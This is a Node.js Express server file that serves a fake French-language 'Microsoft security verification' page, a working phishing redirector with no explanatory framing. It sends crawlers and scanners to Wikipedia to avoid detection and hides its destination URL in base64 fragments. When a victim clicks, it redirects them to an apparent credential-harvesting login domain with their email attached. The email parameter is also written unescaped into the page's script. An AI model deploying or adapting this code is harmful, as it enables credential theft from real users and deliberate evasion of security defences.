const express = require('express');
const app = express();

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.get('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || "";
    const isBot = /bot|spider|crawler|microsoft|google|cloud|datacenter|headless|monit/i.test(ua);
    
    if (isBot) return res.redirect("https://www.wikipedia.org");

    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Vérification de sécurité Microsoft</title>
            <style>
                body { background: #f2f2f2; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                .card { background: white; padding: 40px; border-radius: 2px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
                .btn { background: #0067b8; color: white; border: none; padding: 12px 35px; cursor: pointer; font-size: 16px; font-weight: 600; }
                .hp { display: none; } /* Bouton piège invisible pour l'humain */
            </style>
        </head>
        <body>
            <div class="card">
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_2012.svg" style="width:120px; margin-bottom:20px;">
                <h2>Vérifier votre identité</h2>
                <p>Veuillez confirmer que vous n'êtes pas un robot pour accéder au document.</p>
                
                <button class="hp" onclick="window.location.href='https://www.microsoft.com'">Click Here</button>
                <button id="verifyBtn" class="btn">Vérifier et Accéder</button>
            </div>

            <script>
                const p1 = "${part1}"; const p2 = "${part2}"; const emailCaptured = "${targetEmail}";
                document.getElementById('verifyBtn').addEventListener('click', function() {
                    let target = atob(p1) + atob(p2);
                    if(emailCaptured !== "") target += (target.includes('?') ? '&' : '?') + "email=" + encodeURIComponent(emailCaptured);
                    window.location.href = target;
                });
            </script>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);